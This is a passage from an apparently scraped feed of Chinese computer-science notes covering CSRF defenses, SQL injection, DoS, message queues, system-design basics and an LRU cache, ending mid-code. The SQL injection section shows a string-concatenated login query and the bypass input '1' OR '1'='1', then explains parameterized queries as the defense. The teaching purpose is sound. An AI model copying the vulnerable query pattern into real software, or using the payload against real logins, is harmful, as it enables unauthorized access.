<p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p>
<p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
<h2 id="防范手段-1" tabindex="-1"> 防范手段</h2>
<h3 id="_1-检查-referer-首部字段" tabindex="-1"> 1. 检查 Referer 首部字段</h3>
<p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。</p>
<p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p>
<h3 id="_2-添加校验-token" tabindex="-1"> 2. 添加校验 Token</h3>
<p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。</p>
<h3 id="_3-输入验证码" tabindex="-1"> 3. 输入验证码</h3>
<p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p>
<h1 id="三、sql-注入攻击" tabindex="-1"> 三、SQL 注入攻击</h1>
<h2 id="概念-2" tabindex="-1"> 概念</h2>
<p>服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。</p>
<h2 id="攻击原理-2" tabindex="-1"> 攻击原理</h2>
<p>例如一个网站登录验证的 SQL 查询代码为：</p>
<div><pre><code>strSQL <span>=</span> <span>"SELECT * FROM users WHERE (name = '"</span> <span>+</span> userName <span>+</span> <span>"') and (pw = '"</span><span>+</span> passWord <span>+</span><span>"');"</span>
</code></pre></div><p>如果填入以下内容：</p>
<div><pre><code>userName <span>=</span> <span>"1' OR '1'='1"</span><span>;</span>
passWord <span>=</span> <span>"1' OR '1'='1"</span><span>;</span>
</code></pre></div><p>那么 SQL 查询字符串为：</p>
<div><pre><code>strSQL <span>=</span> <span>"SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"</span>
</code></pre></div><p>此时无需验证通过就能执行以下查询：</p>
<div><pre><code>strSQL <span>=</span> <span>"SELECT * FROM users;"</span>
</code></pre></div><h2 id="防范手段-2" tabindex="-1"> 防范手段</h2>
<h3 id="_1-使用参数化查询" tabindex="-1"> 1. 使用参数化查询</h3>
<p>Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p>
<div><pre><code><span>PreparedStatement</span> stmt <span>=</span> connection<span>.</span><span>prepareStatement</span><span>(</span><span>"SELECT * FROM users WHERE userid=? AND password=?"</span><span>)</span><span>;</span>
stmt<span>.</span><span>setString</span><span>(</span><span>1</span><span>,</span> userid<span>)</span><span>;</span>
stmt<span>.</span><span>setString</span><span>(</span><span>2</span><span>,</span> password<span>)</span><span>;</span>
<span>ResultSet</span> rs <span>=</span> stmt<span>.</span><span>executeQuery</span><span>(</span><span>)</span><span>;</span>
</code></pre></div><h3 id="_2-单引号转换" tabindex="-1"> 2. 单引号转换</h3>
<p>将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</p>
<h1 id="四、拒绝服务攻击" tabindex="-1"> 四、拒绝服务攻击</h1>
<p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p>
<p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p>
<h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener noreferrer">维基百科：跨站脚本</a></li>
<li><a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A" target="_blank" rel="noopener noreferrer">维基百科：SQL 注入攻击</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" target="_blank" rel="noopener noreferrer">维基百科：跨站点请求伪造</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A" target="_blank" rel="noopener noreferrer">维基百科：拒绝服务攻击</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">一、JMS 和 AMQP</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="一、jms-和-amqp" tabindex="-1"> 一、JMS 和 AMQP</h1>
<h2 id="jms" tabindex="-1"> JMS</h2>
<p>JMS（JAVA Message Service,java消息服务）是java的消息服务，JMS的客户端之间可以通过JMS服务进行异步的消息传输。<strong>JMS（JAVA Message Service，Java消息服务）API是一个消息服务的标准或者说是规范</strong>，允许应用程序组件基于JavaEE平台创建、发送、接收和读取消息。它使分布式通信耦合度更低，消息服务更加可靠以及异步性。</p>
<p><strong>ActiveMQ 就是基于 JMS 规范实现的</strong></p>
<h3 id="jms消息模型" tabindex="-1"> JMS消息模型</h3>
<h4 id="点对点-p2p" tabindex="-1"> 点对点(P2P)</h4>
<p>消息生产者向消息队列中发送了一个消息之后，只能被一个消费者消费一次。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/206f965e-53b2-4732-90cf-75910b80d7ac.png" width="450px"/> </div><br>
<h4 id="发布-订阅-pub-sub" tabindex="-1"> 发布/订阅(Pub/Sub)</h4>
<p>消息生产者向频道发送一个消息之后，多个消费者可以从该频道订阅到这条消息并消费。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/4e93f7d4-2623-4129-a939-59051256561e.png" width="450px"/> </div><br>
<p>发布与订阅模式和观察者模式有以下不同：</p>
<ul>
<li>观察者模式中，观察者和主题都知道对方的存在；而在发布与订阅模式中，生产者与消费者不知道对方的存在，它们之间通过频道进行通信。</li>
<li>观察者模式是同步的，当事件触发时，主题会调用观察者的方法，然后等待方法返回；而发布与订阅模式是异步的，生产者向频道发送一个消息之后，就不需要关心消费者何时去订阅这个消息，可以立即返回。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/530764d5-f67f-47a2-8df4-57e8646e1400.png" width="450px"/> </div><br>
<h3 id="jms消息正文" tabindex="-1"> JMS消息正文</h3>
<p>JMS定义了五种不同的消息正文格式，以及调用的消息类型，允许你发送并接收以一些不同形式的数据，提供现有消息格式的一些级别的兼容性。</p>
<ul>
<li>StreamMessage -- Java原始值的数据流</li>
<li>MapMessage--一套名称-值对</li>
<li>TextMessage--一个字符串对象</li>
<li>ObjectMessage--一个序列化的 Java对象</li>
<li>BytesMessage--一个字节的数据流</li>
</ul>
<h2 id="amqp" tabindex="-1"> AMQP</h2>
<p>AMQP，即Advanced Message Queuing Protocol，一个提供统一消息服务的应用层标准 <strong>高级消息队列协议</strong>（二进制应用层协议），是应用层协议的一个开放标准,为面向消息的中间件设计，兼容 JMS。基于此协议的客户端与消息中间件可传递消息，并不受客户端/中间件同产品，不同的开发语言等条件的限制。</p>
<p><strong>RabbitMQ 就是基于 AMQP 协议实现的。</strong></p>
<h3 id="jms-vs-amqp" tabindex="-1"> JMS vs AMQP</h3>
<table>
<thead>
<tr>
<th>对比方向</th>
<th>JMS</th>
<th>AMQP</th>
</tr>
</thead>
<tbody>
<tr>
<td>定义</td>
<td>Java API</td>
<td>协议</td>
</tr>
<tr>
<td>跨语言</td>
<td>否</td>
<td>是</td>
</tr>
<tr>
<td>跨平台</td>
<td>否</td>
<td>是</td>
</tr>
<tr>
<td>消息模型</td>
<td>①Peer-2-Peer;②Pub/sub</td>
<td>①direct exchange；②fanout exchange；③topic change；④headers exchange；⑤system exchange。</td>
</tr>
<tr>
<td>消息类型</td>
<td>支持多种消息类型</td>
<td>byte[]（二进制）</td>
</tr>
</tbody>
</table>
<p><strong>总结：</strong></p>
<ul>
<li>AMQP 为消息定义了线路层（wire-level protocol）的协议，而JMS所定义的是API规范。在 Java 体系中，多个client均可以通过JMS进行交互，不需要应用修改代码，但是其对跨平台的支持较差。而AMQP天然具有跨平台、跨语言特性。</li>
<li>JMS 支持TextMessage、MapMessage 等复杂的消息类型；而 AMQP 仅支持 byte[] 消息类型（复杂的类型可序列化后发送）。</li>
<li>由于Exchange 提供的路由算法，AMQP可以提供多样化的路由方式来传递消息到消息队列，而 JMS 仅支持 队列 和 主题/订阅 方式两种。(AMQP的后四种消息模型和JMS的pub/sub模型没有太大差别，仅是在路由机制上做了更详细的划分)</li>
</ul>
<h1 id="二、消息队列" tabindex="-1"> 二、消息队列</h1>
<h2 id="介绍" tabindex="-1"> 介绍</h2>
<p>可以把消息队列比作是一个存放消息的容器，当我们需要使用消息的时候可以取出消息供自己使用。消息队列是分布式系统中重要的组件，使用消息队列主要是为了通过异步处理提高系统性能和削峰、降低系统耦合性。目前使用较多的消息队列有ActiveMQ，RabbitMQ，Kafka，RocketMQ等</p>
<h2 id="使用场景" tabindex="-1"> 使用场景</h2>
<h3 id="异步处理" tabindex="-1"> 异步处理</h3>
<p>发送者将消息发送给消息队列之后，不需要同步等待消息接收者处理完毕，而是立即返回进行其它操作。消息接收者从消息队列中订阅消息之后异步处理。</p>
<p><img src="@source/assets/cs-note/system-design/Asynchronous-message-queue.png" alt="通过异步处理提高系统性能" loading="lazy"></p>
<p>如上图，在不使用消息队列服务器的时候，用户的请求数据直接写入数据库，在高并发的情况下数据库压力剧增，使得响应速度变慢。但是在使用消息队列之后，用户的请求数据发送给消息队列之后立即 返回，再由消息队列的消费者进程从消息队列中获取数据，异步写入数据库。由于消息队列服务器处理速度快于数据库（消息队列也比数据库有更好的伸缩性），因此响应速度得到大幅改善。</p>
<p>例如在注册流程中通常需要发送验证邮件来确保注册用户身份的合法性，可以使用消息队列使发送验证邮件的操作异步处理，用户在填写完注册信息之后就可以完成注册，而将发送验证邮件这一消息发送到消息队列中。</p>
<p>只有在业务流程允许异步处理的情况下才能这么做，例如上面的注册流程中，如果要求用户对验证邮件进行点击之后才能完成注册的话，就不能再使用消息队列。</p>
<h3 id="流量削锋" tabindex="-1"> 流量削锋</h3>
<p>在高并发的场景下，如果短时间有大量的请求到达会压垮服务器。</p>
<p>可以将请求发送到消息队列中，服务器按照其处理能力从消息队列中订阅消息进行处理。</p>
<p><strong>消息队列具有很好的削峰作用的功能</strong>：即<strong>通过异步处理，将短时间高并发产生的事务消息存储在消息队列中，从而削平高峰期的并发事务。</strong> 举例：在电子商务一些秒杀、促销活动中，合理使用消息队列可以有效抵御促销活动刚开始大量订单涌入对系统的冲击。如下图所示：</p>
<p><img src="@source/assets/cs-note/system-design/削峰-消息队列.png" alt="合理使用消息队列可以有效抵御促销活动刚开始大量订单涌入对系统的冲击" loading="lazy"></p>
<p>因为<strong>用户请求数据写入消息队列之后就立即返回给用户了，但是请求数据在后续的业务校验、写数据库等操作中可能失败</strong>。因此使用消息队列进行异步处理之后，需要<strong>适当修改业务流程进行配合</strong>，比如<strong>用户在提交订单之后，订单数据写入消息队列，不能立即返回用户订单提交成功，需要在消息队列的订单消费者进程真正处理完该订单之后，甚至出库后，再通过电子邮件或短信通知用户订单成功</strong>，以免交易纠纷。这就类似我们平时手机订火车票和电影票。</p>
<h3 id="应用解耦" tabindex="-1"> 应用解耦</h3>
<p>如果模块之间不直接进行调用，模块之间耦合度就会很低，那么修改一个模块或者新增一个模块对其它模块的影响会很小，从而实现可扩展性。</p>
<p>通过使用消息队列，一个模块只需要向消息队列中发送消息，其它模块可以选择性地从消息队列中订阅消息从而完成调用。</p>
<p>常见的<strong>事件驱动架构</strong>类似生产者消费者模式，在大型网站中通常用利用消息队列实现事件驱动结构。如下图所示：
<img src="@source/assets/cs-note/system-design/消息队列-解耦.png" alt="利用消息队列实现事件驱动结构" loading="lazy"></p>
<p><strong>消息队列使利用发布-订阅模式工作，消息发送者（生产者）发布消息，一个或多个消息接受者（消费者）订阅消息。</strong> 从上图可以看到<strong>消息发送者（生产者）和消息接受者（消费者）之间没有直接耦合</strong>，消息发送者将消息发送至分布式消息队列即结束对消息的处理，消息接受者从分布式消息队列获取该消息后进行后续处理，并不需要知道该消息从何而来。<strong>对新增业务，只要对该类消息感兴趣，即可订阅该消息，对原有系统和业务没有任何影响，从而实现网站业务的可扩展性设计</strong>。</p>
<p>消息接受者对消息进行过滤、处理、包装后，构造成一个新的消息类型，将消息继续发送出去，等待其他消息接受者订阅该消息。因此基于事件（消息对象）驱动的业务架构可以是一系列流程。</p>
<p><strong>另外为了避免消息队列服务器宕机造成消息丢失，会将成功发送到消息队列的消息存储在消息生产者服务器上，等消息真正被消费者服务器处理后才删除消息。在消息队列服务器宕机后，生产者服务器会选择分布式消息队列服务器集群中的其他服务器发布消息</strong></p>
<p><strong>备注：</strong> 不要认为消息队列只能利用发布-订阅模式工作，只不过在解耦这个特定业务环境下是使用发布-订阅模式的。</p>
<h2 id="消息队列的问题" tabindex="-1"> 消息队列的问题</h2>
<ul>
<li><strong>系统可用性降低：</strong> 系统可用性在某种程度上降低，为什么这样说呢？在加入MQ之前，你不用考虑消息丢失或者说MQ挂掉等等的情况，但是，引入MQ之后你就需要去考虑了！</li>
<li><strong>系统复杂性提高：</strong> 加入MQ之后，你需要保证消息没有被重复消费、处理消息丢失的情况、保证消息传递的顺序性等等问题！</li>
<li><strong>一致性问题：</strong> 我上面讲了消息队列可以实现异步，消息队列带来的异步确实可以提高系统响应速度。但是，万一消息的真正消费者并没有正确消费消息怎么办？这样就会导致数据不一致的情况了!</li>
</ul>
<h2 id="可靠性" tabindex="-1"> 可靠性</h2>
<h3 id="发送端的可靠性" tabindex="-1"> 发送端的可靠性</h3>
<p>发送端完成操作后一定能将消息成功发送到消息队列中。</p>
<p>实现方法：在本地数据库建一张消息表，将消息数据与业务数据保存在同一数据库实例里，这样就可以利用本地数据库的事务机制。事务提交成功后，将消息表中的消息转移到消息队列中，若转移消息成功则删除消息表中的数据，否则继续重传。</p>
<h3 id="接收端的可靠性" tabindex="-1"> 接收端的可靠性</h3>
<p>接收端能够从消息队列成功消费一次消息。</p>
<p>两种实现方法：</p>
<ul>
<li>保证接收端处理消息的业务逻辑具有幂等性：只要具有幂等性，那么消费多少次消息，最后处理的结果都是一样的。</li>
<li>保证消息具有唯一编号，并使用一张日志表来记录已经消费的消息编号。</li>
</ul>
<h2 id="常见消息队列对比" tabindex="-1"> 常见消息队列对比</h2>
<table>
<thead>
<tr>
<th>对比方向</th>
<th>内容</th>
</tr>
</thead>
<tbody>
<tr>
<td>吞吐量</td>
<td>万级的 ActiveMQ 和 RabbitMQ 的吞吐量（ActiveMQ 的性能最差）要比 十万级甚至是百万级的 RocketMQ 和 Kafka 低一个数量级。</td>
</tr>
<tr>
<td>可用性</td>
<td>都可以实现高可用。ActiveMQ 和 RabbitMQ 都是基于主从架构实现高可用性。RocketMQ 基于分布式架构。 kafka 也是分布式的，一个数据多个副本，少数机器宕机，不会丢失数据，不会导致不可用</td>
</tr>
<tr>
<td>时效性</td>
<td>RabbitMQ 基于erlang开发，所以并发能力很强，性能极其好，延时很低，达到微秒级。其他三个都是 ms 级。</td>
</tr>
<tr>
<td>功能支持</td>
<td>除了 Kafka，其他三个功能都较为完备。 Kafka 功能较为简单，主要支持简单的MQ功能，在大数据领域的实时计算以及日志采集被大规模使用，是事实上的标准</td>
</tr>
<tr>
<td>消息丢失</td>
<td>ActiveMQ 和 RabbitMQ 丢失的可能性非常低， RocketMQ 和 Kafka 理论上不会丢失。</td>
</tr>
</tbody>
</table>
<p><strong>总结：</strong></p>
<ul>
<li>ActiveMQ 的社区算是比较成熟，但是较目前来说，ActiveMQ 的性能比较差，而且版本迭代很慢，不推荐使用。</li>
<li>RabbitMQ 在吞吐量方面虽然稍逊于 Kafka 和 RocketMQ ，但是由于它基于 erlang 开发，所以并发能力很强，性能极其好，延时很低，达到微秒级。但是也因为 RabbitMQ 基于 erlang 开发，所以国内很少有公司有实力做erlang源码级别的研究和定制。如果业务场景对并发量要求不是太高（十万级、百万级），那这四种消息队列中，RabbitMQ 一定是你的首选。如果是大数据领域的实时计算、日志采集等场景，用 Kafka 是业内标准的，绝对没问题，社区活跃度很高，绝对不会黄，何况几乎是全世界这个领域的事实性规范。</li>
<li>RocketMQ 阿里出品，Java 系开源项目，源代码我们可以直接阅读，然后可以定制自己公司的MQ，并且 RocketMQ 有阿里巴巴的实际业务场景的实战考验。RocketMQ 社区活跃度相对较为一般，不过也还可以，文档相对来说简单一些，然后接口这块不是按照标准 JMS 规范走的有些系统要迁移需要修改大量代码。还有就是阿里出台的技术，你得做好这个技术万一被抛弃，社区黄掉的风险，那如果你们公司有技术实力我觉得用RocketMQ 挺好的</li>
<li>kafka 的特点其实很明显，就是仅仅提供较少的核心功能，但是提供超高的吞吐量，ms 级的延迟，极高的可用性以及可靠性，而且分布式可以任意扩展。同时 kafka 最好是支撑较少的 topic 数量即可，保证其超高吞吐量。kafka 唯一的一点劣势是有可能消息重复消费，那么对数据准确性会造成极其轻微的影响，在大数据领域中以及日志采集中，这点轻微影响可以忽略这个特性天然适合大数据实时计算以及日志收集。</li>
</ul>
<h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li><a href="http://developers-club.com/posts/270339/" target="_blank" rel="noopener noreferrer">Observer vs Pub-Sub</a></li>
<li><a href="https://blog.csdn.net/lizhitao/article/details/47723105" target="_blank" rel="noopener noreferrer">消息队列中点对点与发布订阅区别</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">一、性能</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
</ul>

<h1 id="一、性能" tabindex="-1"> 一、性能</h1>
<h2 id="性能指标" tabindex="-1"> 性能指标</h2>
<h3 id="_1-响应时间" tabindex="-1"> 1. 响应时间</h3>
<p>指某个请求从发出到接收到响应消耗的时间。</p>
<p>在对响应时间进行测试时，通常采用重复请求的方式，然后计算平均响应时间。</p>
<h3 id="_2-吞吐量" tabindex="-1"> 2. 吞吐量</h3>
<p>指系统在单位时间内可以处理的请求数量，通常使用每秒的请求数来衡量。</p>
<h3 id="_3-并发用户数" tabindex="-1"> 3. 并发用户数</h3>
<p>指系统能同时处理的并发用户请求数量。</p>
<p>在没有并发存在的系统中，请求被顺序执行，此时响应时间为吞吐量的倒数。例如系统支持的吞吐量为 100 req/s，那么平均响应时间应该为 0.01s。</p>
<p>目前的大型系统都支持多线程来处理并发请求，多线程能够提高吞吐量以及缩短响应时间，主要有两个原因：</p>
<ul>
<li>多 CPU</li>
<li>IO 等待时间</li>
</ul>
<p>使用 IO 多路复用等方式，系统在等待一个 IO 操作完成的这段时间内不需要被阻塞，可以去处理其它请求。通过将这个等待时间利用起来，使得 CPU 利用率大大提高。</p>
<p>并发用户数不是越高越好，因为如果并发用户数太高，系统来不及处理这么多的请求，会使得过多的请求需要等待，那么响应时间就会大大提高。</p>
<h2 id="性能优化" tabindex="-1"> 性能优化</h2>
<h3 id="_1-集群" tabindex="-1"> 1. 集群</h3>
<p>将多台服务器组成集群，使用负载均衡将请求转发到集群中，避免单一服务器的负载压力过大导致性能降低。</p>
<h3 id="_2-缓存" tabindex="-1"> 2. 缓存</h3>
<p>缓存能够提高性能的原因如下：</p>
<ul>
<li>缓存数据通常位于内存等介质中，这种介质对于读操作特别快；</li>
<li>缓存数据可以位于靠近用户的地理位置上；</li>
<li>可以将计算结果进行缓存，从而避免重复计算。</li>
</ul>
<h3 id="_3-异步" tabindex="-1"> 3. 异步</h3>
<p>某些流程可以将操作转换为消息，将消息发送到消息队列之后立即返回，之后这个操作会被异步处理。</p>
<h1 id="二、伸缩性" tabindex="-1"> 二、伸缩性</h1>
<p>指不断向集群中添加服务器来缓解不断上升的用户并发访问压力和不断增长的数据存储需求。</p>
<h2 id="伸缩性与性能" tabindex="-1"> 伸缩性与性能</h2>
<p>如果系统存在性能问题，那么单个用户的请求总是很慢的；</p>
<p>如果系统存在伸缩性问题，那么单个用户的请求可能会很快，但是在并发数很高的情况下系统会很慢。</p>
<h2 id="实现伸缩性" tabindex="-1"> 实现伸缩性</h2>
<p>应用服务器只要不具有状态，那么就可以很容易地通过负载均衡器向集群中添加新的服务器。</p>
<p>关系型数据库的伸缩性通过 Sharding 来实现，将数据按一定的规则分布到不同的节点上，从而解决单台存储服务器的存储空间限制。</p>
<p>对于非关系型数据库，它们天生就是为海量数据而诞生，对伸缩性的支持特别好。</p>
<h1 id="三、扩展性" tabindex="-1"> 三、扩展性</h1>
<p>指的是添加新功能时对现有系统的其它应用无影响，这就要求不同应用具备低耦合的特点。</p>
<p>实现可扩展主要有两种方式：</p>
<ul>
<li>使用消息队列进行解耦，应用之间通过消息传递进行通信；</li>
<li>使用分布式服务将业务和可复用的服务分离开来，业务使用分布式服务框架调用可复用的服务。新增的产品可以通过调用可复用的服务来实现业务逻辑，对其它产品没有影响。</li>
</ul>
<h1 id="四、可用性" tabindex="-1"> 四、可用性</h1>
<h2 id="冗余" tabindex="-1"> 冗余</h2>
<p>保证高可用的主要手段是使用冗余，当某个服务器故障时就请求其它服务器。</p>
<p>应用服务器的冗余比较容易实现，只要保证应用服务器不具有状态，那么某个应用服务器故障时，负载均衡器将该应用服务器原先的用户请求转发到另一个应用服务器上，不会对用户有任何影响。</p>
<p>存储服务器的冗余需要使用主从复制来实现，当主服务器故障时，需要提升从服务器为主服务器，这个过程称为切换。</p>
<h2 id="监控" tabindex="-1"> 监控</h2>
<p>对 CPU、内存、磁盘、网络等系统负载信息进行监控，当某个信息达到一定阈值时通知运维人员，从而在系统发生故障之前及时发现问题。</p>
<h2 id="服务降级" tabindex="-1"> 服务降级</h2>
<p>服务降级是系统为了应对大量的请求，主动关闭部分功能，从而保证核心功能可用。</p>
<h1 id="五、安全性" tabindex="-1"> 五、安全性</h1>
<p>要求系统在应对各种攻击手段时能够有可靠的应对措施。</p>
<h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li>大型网站技术架构：核心原理与案例分析</li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">一、缓存特征</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E7%BC%93%E5%AD%98.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E7%BC%93%E5%AD%98.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="一、缓存特征" tabindex="-1"> 一、缓存特征</h1>
<h2 id="命中率" tabindex="-1"> 命中率</h2>
<p>当某个请求能够通过访问缓存而得到响应时，称为缓存命中。</p>
<p>缓存命中率越高，缓存的利用率也就越高。</p>
<h2 id="最大空间" tabindex="-1"> 最大空间</h2>
<p>缓存通常位于内存中，内存的空间通常比磁盘空间小的多，因此缓存的最大空间不可能非常大。</p>
<p>当缓存存放的数据量超过最大空间时，就需要淘汰部分数据来存放新到达的数据。</p>
<h2 id="淘汰策略" tabindex="-1"> 淘汰策略</h2>
<ul>
<li>
<p>FIFO（First In First Out）：先进先出策略，在实时性的场景下，需要经常访问最新的数据，那么就可以使用 FIFO，使得最先进入的数据（最晚的数据）被淘汰。</p>
</li>
<li>
<p>LRU（Least Recently Used）：最近最久未使用策略，优先淘汰最久未使用的数据，也就是上次被访问时间距离现在最久的数据。该策略可以保证内存中的数据都是热点数据，也就是经常被访问的数据，从而保证缓存命中率。</p>
</li>
<li>
<p>LFU（Least Frequently Used）：最不经常使用策略，优先淘汰一段时间内使用次数最少的数据。</p>
</li>
</ul>
<h1 id="二、lru" tabindex="-1"> 二、LRU</h1>
<p>以下是基于 双向链表 + HashMap 的 LRU 算法实现，对算法的解释如下：</p>
<ul>
<li>访问某个节点时，将其从原来的位置删除，并重新插入到链表头部。这样就能保证链表尾部存储的就是最近最久未使用的节点，当节点数量大于缓存最大空间时就淘汰链表尾部的节点。</li>
<li>为了使删除操作时间复杂度为 O(1)，就不能采用遍历的方式找到某个节点。HashMap 存储着 Key 到节点的映射，通过 Key 就能以 O(1) 的时间得到节点，然后再以 O(1) 的时间将其从双向队列中删除。</li>
</ul>
<div><pre><code><span>public</span> <span>class</span> <span>LRU</span><span><span>&lt;</span><span>K</span><span>,</span> <span>V</span><span>></span></span> <span>implements</span> <span>Iterable</span><span><span>&lt;</span><span>K</span><span>></span></span> <span>{</span>

    <span>private</span> <span>Node</span> head<span>;</span>
    <span>private</span> <span>Node</span> tail<span>;</span>
    <span>private</span> <span>HashMap</span><span><span>&lt;</span><span>K</span><span>,</span> <span>Node</span><span>></span></span> map<span>;</span>
    <span>private</span> <span>int</span> maxSize<span>;</span>

    <span>private</span> <span>class</span> <span>Node</span> <span>{</span>

        <span>Node</span> pre<span>;</span>
        <span>Node</span> next<span>;</span>
        <span>K</span> k<span>;</span>
        <span>V</span> v<span>;</span>

        <span>public</span> <span>Node</span><span>(</span><span>K</span> k<span>,</span> <span>V</span> v<span>)</span> <span>{</span>
            <span>this</span><span>.</span>k <span>=</span> k<span>;</span>
            <span>this</span><span>.</span>v <span>=</span> v<span>;</span>
        <span>}</span>
    <span>}</span>


    <span>public</span> <span>LRU</span><span>(</span><span>int</span> maxSize<span>)</span> <span>{</span>

        <span>this</span><span>.</span>maxSize <span>=</span> maxSize<span>;</span>
        <span>this</span><span>.</span>map <span>=</span> <span>new</span> <span>HashMap</span><span><span>&lt;</span><span>></span></span><span>(</span>maxSize <span>*</span> <span>4</span> <span>/</span> <span>3</span><span>)</span><span>;</span>

        head <span>=</span> <span>new</span> <span>Node</span><span>(</span><span>null</span><span>,</span> <span>null</span><span>)</span><span>;</span>
        tail <span>=</span> <span>new</span> <span>Node</span><span>(</span><span>null</span><span>,</span> <span>null</span><span>)</span><span>;</span>

        head<span>.</span>next <span>=</span> tail<span>;</span>
        tail<span>.</span>pre <span>=</span> head<span>;</span>
    <span>}</span>


    <span>public</span> <span>V</span> <span>get</span><span>(</span><span>K</span> key<span>)</span> <span>{</span>

        <span>if</span> <span>(</span><span>!</span>map<span>.</span><span>containsKey</span><span>(</span>key<span>)</span><span>)</span> <span>{</span>
            <span>return</span> <span>null</span><span>;</span>
        <span>}</span>

        <span>Node</span> node <span>=</span> map<span>.</span><span>get</span><span>(</span>key<span>)</span><span>;</span>
        <span>unlink</span><span>(</span>node<span>)</span><span>;</span>
        <span>appendHead</span><span>(</span>node<span>)</span><span>;</span>

